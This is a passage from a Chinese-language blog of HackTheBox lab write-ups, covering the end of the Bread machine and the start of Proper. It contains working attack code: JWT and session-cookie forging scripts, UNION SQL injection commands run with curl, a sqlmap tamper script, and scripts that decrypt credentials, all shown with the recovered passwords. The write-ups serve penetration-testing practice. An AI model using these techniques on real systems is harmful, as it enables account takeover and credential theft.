class="line"><span class="variable">$LOGGED_IN</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>] !== <span class="string">&quot;paul&quot;</span>)&#123;</span><br><span class="line">    header(<span class="string">&quot;Location: ../index.php&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;loggedIn&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$LOGGED_IN</span> = <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">require</span> <span class="string">&#x27;../db/db.php&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    header(<span class="string">&quot;Location: ../auth/login.php&quot;</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>而且files.php存在一个上传功能<br />以理一下攻击链</p><ul><li>fileController.php上传文件</li><li>要求得到<code>paul</code>的身份</li><li>生成<code>PHPSESSID</code>和<code>JWT</code></li></ul><p>对于<code>JWT</code></p><p>我们已经得到了签名密钥</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"><span class="keyword">import</span> jwt</span><br><span class="line">token_dict = &#123;<span class="string">&quot;data&quot;</span>:&#123;<span class="string">&quot;username&quot;</span>:<span class="string">&quot;paul&quot;</span>&#125;&#125;</span><br><span class="line">headers = &#123;<span class="string">&quot;typ&quot;</span>:<span class="string">&quot;JWT&quot;</span>, <span class="string">&quot;alg&quot;</span>:<span class="string">&quot;HS256&quot;</span>&#125;</span><br><span class="line">jwt_token = jwt.encode(token_dict, <span class="string">&quot;6cb9c1a2786a483ca5e44571dcc5f3bfa298593a6376ad92185c3258acd5591e&quot;</span>, algorithm=<span class="string">&quot;HS256&quot;</span>, headers=headers).decode(<span class="string">&#x27;ascii&#x27;</span>)</span><br><span class="line">print(jwt_token)</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJkYXRhIjp7InVzZXJuYW1lIjoicGF1bCJ9fQ.4mJguG8tRd2z_feWJpmr_J3AdMeDPvW7GCK7cW7o0AI</span><br></pre></td></tr></table></figure><p>对于<code>PHPSESSID</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$num</span> = <span class="keyword">array</span>(<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>);</span><br><span class="line">    <span class="variable">$username</span> = <span class="string">&quot;paul&quot;</span>;</span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$num</span> <span class="keyword">as</span> <span class="variable">$a</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$key</span> = <span class="string">&quot;s4lTy_stR1nG_&quot;</span>.<span class="variable">$username</span>[<span class="variable">$a</span>].<span class="string">&quot;(!528./9890&quot;</span>;</span><br><span class="line">        <span class="variable">$session_cookie</span> = <span class="variable">$username</span>.md5(<span class="variable">$key</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$session_cookie</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">paula2a6a014d3bee04d7df8d5837d62e8c5</span><br><span class="line">paul61ff9d4aaefe6bdf45681678ba89ff9d</span><br><span class="line">paul8c8808867b53c49777fe5559164708c3</span><br><span class="line">paul47200b180ccd6835d25d034eeb6e6390</span><br></pre></td></tr></table></figure><p>最后得到的Cookie为</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Cookie: token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJkYXRhIjp7InVzZXJuYW1lIjoicGF1bCJ9fQ.4mJguG8tRd2z_feWJpmr_J3AdMeDPvW7GCK7cW7o0AI; PHPSESSID=paul47200b180ccd6835d25d034eeb6e6390</span><br></pre></td></tr></table></figure><p>上传ZIP时修改文件名和文件内容即可GetShell</p><h2 id="权限提升-5"><a class="markdownIt-Anchor" href="#权限提升-5"></a> 权限提升</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">type</span> C:\Users\www-data\Desktop\xampp\htdocs\portal\pizzaDeliveryUserData\juliette.json</span><br></pre></td></tr></table></figure><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line"><span class="attr">&quot;pizza&quot;</span> : <span class="string">&quot;margherita&quot;</span>,</span><br><span class="line"><span class="attr">&quot;size&quot;</span> : <span class="string">&quot;large&quot;</span>,</span><br><span class="line"><span class="attr">&quot;drink&quot;</span> : <span class="string">&quot;water&quot;</span>,</span><br><span class="line"><span class="attr">&quot;card&quot;</span> : <span class="string">&quot;VISA&quot;</span>,</span><br><span class="line"><span class="attr">&quot;PIN&quot;</span> : <span class="string">&quot;9890&quot;</span>,</span><br><span class="line"><span class="attr">&quot;alternate&quot;</span> : &#123;</span><br><span class="line"><span class="attr">&quot;username&quot;</span> : <span class="string">&quot;juliette&quot;</span>,</span><br><span class="line"><span class="attr">&quot;password&quot;</span> : <span class="string">&quot;jUli901./())!&quot;</span>,</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用凭证<code>juliette:jUli901./())!</code>登入ssh服务</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">type</span> C:\Users\juliette\Desktop\user.txt</span><br><span class="line">c5d9d568c5fc21e0dc0c5819d16aad9f</span><br><span class="line"></span><br><span class="line"><span class="built_in">type</span> C:\Users\juliette\Desktop\todo.html</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;style&gt;</span><br><span class="line">html&#123;</span><br><span class="line">background:black;</span><br><span class="line">color:orange;</span><br><span class="line">&#125;</span><br><span class="line">table,th,td&#123;</span><br><span class="line">border:1px solid orange;</span><br><span class="line">padding:1em;</span><br><span class="line">border-collapse:collapse;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/style&gt;</span><br><span class="line">&lt;table&gt;</span><br><span class="line">        &lt;tr&gt;</span><br><span class="line">            &lt;th&gt;Task&lt;/th&gt;</span><br><span class="line">            &lt;th&gt;Status&lt;/th&gt;</span><br><span class="line">            &lt;th&gt;Reason&lt;/th&gt;</span><br><span class="line">        &lt;/tr&gt;</span><br><span class="line">        &lt;tr&gt;</span><br><span class="line">            &lt;td&gt;Configure firewall <span class="keyword">for</span> port 22 and 445&lt;/td&gt;</span><br><span class="line">            &lt;td&gt;Not started&lt;/td&gt;</span><br><span class="line">            &lt;td&gt;Unauthorized access might be possible&lt;/td&gt;</span><br><span class="line">        &lt;/tr&gt;</span><br><span class="line">        &lt;tr&gt;</span><br><span class="line">            &lt;td&gt;Migrate passwords from the Microsoft Store Sticky Notes application to our new password manager&lt;/td&gt;   </span><br><span class="line">            &lt;td&gt;In progress&lt;/td&gt;</span><br><span class="line">            &lt;td&gt;It stores passwords <span class="keyword">in</span> plain text&lt;/td&gt;</span><br><span class="line">        &lt;/tr&gt;</span><br><span class="line">        &lt;tr&gt;</span><br><span class="line">            &lt;td&gt;Add new features to password manager&lt;/td&gt;</span><br><span class="line">            &lt;td&gt;Not started&lt;/td&gt;</span><br><span class="line">            &lt;td&gt;To get promoted, hopefully lol&lt;/td&gt;</span><br><span class="line">        &lt;/tr&gt;</span><br><span class="line">&lt;/table&gt;</span><br><span class="line"></span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>寻找密码存储文件</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">dir C:\Users\juliette\Documents</span><br><span class="line"></span><br><span class="line">11/29/2020  04:10 AM             4,096 plum.sqlite</span><br><span class="line">01/15/2021  05:10 PM            32,768 plum.sqlite-shm</span><br><span class="line">01/15/2021  05:10 PM           329,632 plum.sqlite-wal</span><br></pre></td></tr></table></figure><p>复制到本地使用sqlite访问</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">sqlite3 plum.sqlite </span><br><span class="line">sqlite&gt; .tables</span><br><span class="line">Media           Stroke          SyncState       User          </span><br><span class="line">Note            StrokeMetadata  UpgradedNote  </span><br><span class="line">sqlite&gt; select * from Note;</span><br><span class="line">\id=48c70e58-fcf9-475a-aea4-24ce19a9f9ec juliette: jUli901./())!</span><br><span class="line">\id=fc0d8d70-055d-4870-a5de-d76943a68ea2 development: fN3)sN5Ee@g</span><br><span class="line">\id=48924119-7212-4b01-9e0f-ae6d678d49b2 administrator: [MOVED]|ManagedPosition=|1|0||Yellow|0|||||||0c32c3d8-7c60-48ae-939e-798df198cfe7|8e814e57-9d28-4288-961c-31c806338c5b|637423162765765332||637423163995607122</span><br></pre></td></tr></table></figure><p>得到凭证<code>development:fN3)sN5Ee@g</code></p><p>登入ssh服务</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">dir c:\Development</span><br><span class="line"></span><br><span class="line">11/29/2020  04:11 AM            18,312 Krypter_Linux</span><br></pre></td></tr></table></figure><p>IDA反编译</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">size_t</span> v3; <span class="comment">// rbx</span></span><br><span class="line">  __int64 v4; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">char</span> v6[<span class="number">44</span>]; <span class="comment">// [rsp+10h] [rbp-50h] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> v7; <span class="comment">// [rsp+3Ch] [rbp-24h]</span></span><br><span class="line">  __int64 v8; <span class="comment">// [rsp+40h] [rbp-20h]</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+48h] [rbp-18h]</span></span><br><span class="line">  <span class="keyword">int</span> v10; <span class="comment">// [rsp+4Ch] [rbp-14h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">std</span>::__cxx11::basic_string&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;,<span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt;&gt;::basic_string(v6, argv, envp);</span><br><span class="line">  v8 = curl_easy_init();</span><br><span class="line">  <span class="built_in">puts</span>(</span><br><span class="line">    <span class="string">&quot;Krypter V1.2\n&quot;</span></span><br><span class="line">    <span class="string">&quot;\n&quot;</span></span><br><span class="line">    <span class="string">&quot;New project by Juliette.\n&quot;</span></span><br><span class="line">    <span class="string">&quot;New features added weekly!\n&quot;</span></span><br><span class="line">    <span class="string">&quot;What to expect next update:\n&quot;</span></span><br><span class="line">    <span class="string">&quot;\t- Windows version with GUI support\n&quot;</span></span><br><span class="line">    <span class="string">&quot;\t- Get password from cloud and AUTOMATICALLY decrypt!\n&quot;</span></span><br><span class="line">    <span class="string">&quot;***\n&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( argc == <span class="number">2</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v10 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">      v3 = i;</span><br><span class="line">      <span class="keyword">if</span> ( v3 &gt;= <span class="built_in">strlen</span>(argv[<span class="number">1</span>]) )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      v10 += argv[<span class="number">1</span>][i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v10 == <span class="number">1601</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v8 )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Requesting decryption key from cloud...\nAccount: Administrator&quot;</span>);</span><br><span class="line">        curl_easy_setopt(v8, <span class="number">10002LL</span>, (__int64)<span class="string">&quot;http://passmanager.htb:1234/index.php&quot;</span>);</span><br><span class="line">        curl_easy_setopt(v8, <span class="number">10015LL</span>, (__int64)<span class="string">&quot;method=select&amp;username=administrator&amp;table=passwords&quot;</span>);</span><br><span class="line">        curl_easy_setopt(v8, <span class="number">20011LL</span>, (__int64)WriteCallback);</span><br><span class="line">        curl_easy_setopt(v8, <span class="number">10001LL</span>, (__int64)v6);</span><br><span class="line">        v7 = curl_easy_perform(v8);</span><br><span class="line">        curl_easy_cleanup(v8);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Server response:\n\n&quot;</span>);</span><br><span class="line">        v4 = <span class="built_in">std</span>::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="keyword">char</span>&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, v6);</span><br><span class="line">        <span class="built_in">std</span>::ostream::<span class="keyword">operator</span>&lt;&lt;(v4, &amp;<span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Incorrect master key&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;No key supplied.\nUSAGE:\n\nKrypter &lt;key&gt;&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">std</span>::__cxx11::basic_string&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;,<span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt;&gt;::~basic_string(v6);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">netstat -ant</span><br><span class="line"></span><br><span class="line">  TCP    127.0.0.1:1234         0.0.0.0:0              LISTENING       InHost</span><br></pre></td></tr></table></figure><p>用程序中的URL访问</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">curl <span class="string">&quot;http://127.0.0.1:1234/index.php?method=select&amp;username=administrator&amp;table=passwords&quot;</span></span><br><span class="line"></span><br><span class="line">selectarray(1) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  array(1) &#123;</span><br><span class="line">    [<span class="string">&quot;aes_key&quot;</span>]=&gt;</span><br><span class="line">    string(16) <span class="string">&quot;k19D193j.&lt;19391(&quot;</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>得到AES_KEY</p><p>尝试SQL注入</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">curl <span class="string">&quot;http://127.0.0.1:1234/index.php?method=select&amp;username=&#x27;+or+1%23&amp;table=passwords&quot;</span></span><br><span class="line">selectarray(1) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  array(1) &#123;</span><br><span class="line">    [<span class="string">&quot;aes_key&quot;</span>]=&gt;</span><br><span class="line">    string(16) <span class="string">&quot;k19D193j.&lt;19391(&quot;</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>手工注入</li></ul><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">curl <span class="string">&quot;http://127.0.0.1:1234/index.php?method=select&amp;username=&#x27;+or+1%23&amp;table=passwords&quot;</span></span><br><span class="line">curl <span class="string">&quot;http://127.0.0.1:1234/index.php?method=select&amp;username=&#x27;+union+select+1%23&amp;table=passwords&quot;</span></span><br><span class="line">curl <span class="string">&quot;http://127.0.0.1:1234/index.php?method=select&amp;username=&#x27;+union+select+database()%23&amp;table=passwords&quot;</span></span><br><span class="line">curl <span class="string">&quot;http://127.0.0.1:1234/index.php?method=select&amp;username=&#x27;+union+select+group_concat(table_name)+from+information_schema.tables+where+table_schema=&#x27;bread&#x27;%23&amp;table=passwords&quot;</span></span><br><span class="line">curl <span class="string">&quot;http://127.0.0.1:1234/index.php?method=select&amp;username=&#x27;+union+select+group_concat(column_name)+from+information_schema.columns+where+table_name=&#x27;passwords&#x27;%23&amp;table=passwords&quot;</span></span><br><span class="line">curl <span class="string">&quot;http://127.0.0.1:1234/index.php?method=select&amp;username=&#x27;+union+select+group_concat(password)+from+bread.passwords%23&amp;table=passwords&quot;</span></span><br></pre></td></tr></table></figure><p>得到<code>H2dFz/jNwtSTWDURot9JBhWMP6XOdmcpgqvYHG35QKw=</code></p><ul><li>SSH端口映射跑SQLMap</li></ul><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh -f -N -L 1234:127.0.0.1:1234 development@10.10.10.228</span><br><span class="line">sqlmap -u <span class="string">&quot;http://127.0.0.1:1234/index.php?method=select&amp;username=administrator&amp;table=passwords&quot;</span></span><br></pre></td></tr></table></figure><p>sqlmap的步骤就懒得写了</p><p>解密</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line">iv = <span class="string">b&#x27;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00&#x27;</span></span><br><span class="line">cipher = base64.b64decode(<span class="string">&quot;H2dFz/jNwtSTWDURot9JBhWMP6XOdmcpgqvYHG35QKw=&quot;</span>)</span><br><span class="line">_aes = AES.new(<span class="string">b&quot;k19D193j.&lt;19391(&quot;</span>, AES.MODE_CBC, iv)</span><br><span class="line">plain = _aes.decrypt(cipher)</span><br><span class="line">print(plain)</span><br></pre></td></tr></table></figure><p>得到凭证<code>administrator:p@ssw0rd!@#$9890./</code></p><p>登入SSH服务</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">type</span> c:\Users\Administrator\Desktop\root.txt</span><br><span class="line">c04f72045d76a74c63a602f199a79ecd</span><br></pre></td></tr></table></figure><p>挺综合的一台机器</p><hr /><h1 id="hackthebox_proper"><a class="markdownIt-Anchor" href="#hackthebox_proper"></a> HackTheBox_Proper</h1><h2 id="端口扫描-6"><a class="markdownIt-Anchor" href="#端口扫描-6"></a> 端口扫描</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV -sT -Pn 10.10.10.231</span><br><span class="line"></span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.10.10.231</span><br><span class="line">Host is up (0.081s latency).</span><br><span class="line">Not shown: 999 filtered ports</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">80/tcp open  http    Microsoft IIS httpd 10.0</span><br><span class="line">Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows</span><br></pre></td></tr></table></figure><h2 id="路径扫描-2"><a class="markdownIt-Anchor" href="#路径扫描-2"></a> 路径扫描</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">---- Scanning URL: http://10.10.10.231/ ----</span><br><span class="line">==&gt; DIRECTORY: http://10.10.10.231/assets/</span><br><span class="line">==&gt; DIRECTORY: http://10.10.10.231/licenses/</span><br></pre></td></tr></table></figure><h2 id="漏洞利用-6"><a class="markdownIt-Anchor" href="#漏洞利用-6"></a> 漏洞利用</h2><p>浏览主页源码看到</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;script type=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><br><span class="line">$(<span class="built_in">document</span>).ready(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="meta">&#x27;use strict&#x27;</span>;</span><br><span class="line">jQuery(<span class="string">&#x27;#headerwrap&#x27;</span>).backstretch([ <span class="string">&quot;assets/img/bg/bg1.jpg&quot;</span>, <span class="string">&quot;assets/img/bg/bg3.jpg&quot;</span> ], &#123;<span class="attr">duration</span>: <span class="number">8000</span>, <span class="attr">fade</span>: <span class="number">500</span>&#125;);</span><br><span class="line">$( <span class="string">&quot;#product-content&quot;</span> ).load(<span class="string">&quot;/products-ajax.php?order=id+desc&amp;h=a1b30d31d344a5a4e41e8496ccbdd26b&quot;</span>,<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;&#125;);</span><br><span class="line">&#125;);</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://10.10.10.231/products-ajax.php</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// [8] Undefined index: order On line 6 in file C:\inetpub\wwwroot\products-ajax.php</span></span><br><span class="line">define(<span class="string">&#x27;SECURE_PARAM_SALT&#x27;</span>,<span class="string">&#x27;hie0shah6ooNoim&#x27;</span>); </span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;functions.php&#x27;</span>); </span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;db-config.php&#x27;</span>); </span><br><span class="line"><span class="keyword">if</span> ( !<span class="variable">$_GET</span>[<span class="string">&#x27;order&#x27;</span>] || !<span class="variable">$_GET</span>[<span class="string">&#x27;h&#x27;</span>] ) &#123;</span><br><span class="line"><span class="comment">// Set the response code to 500 </span></span><br><span class="line">http_response_code(<span class="number">500</span>); </span><br><span class="line"><span class="comment">// and die(). Someone fiddled with the parameters. </span></span><br><span class="line"><span class="keyword">die</span>(<span class="string">&#x27;Parameter missing or malformed.&#x27;</span>); </span><br><span class="line">&#125;  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>测试得到以下算法</p><p><code>Hash = md5(Salt+Payload)</code></p><p>SQLMap tamper</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> quote_plus</span><br><span class="line"><span class="keyword">from</span> lib.core.enums <span class="keyword">import</span> PRIORITY</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">tamper</span>(<span class="params">payload, **kwargs</span>):</span></span><br><span class="line">salt = <span class="string">b&quot;hie0shah6ooNoim&quot;</span></span><br><span class="line">h = hashlib.md5(salt + payload.encode()).hexdigest()</span><br><span class="line">retVal = <span class="string">&quot;&#123;&#125;&amp;h=&#123;&#125;&quot;</span>.<span class="built_in">format</span>(payload, h)</span><br><span class="line"><span class="keyword">return</span> retVal</span><br></pre></td></tr></table></figure><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span 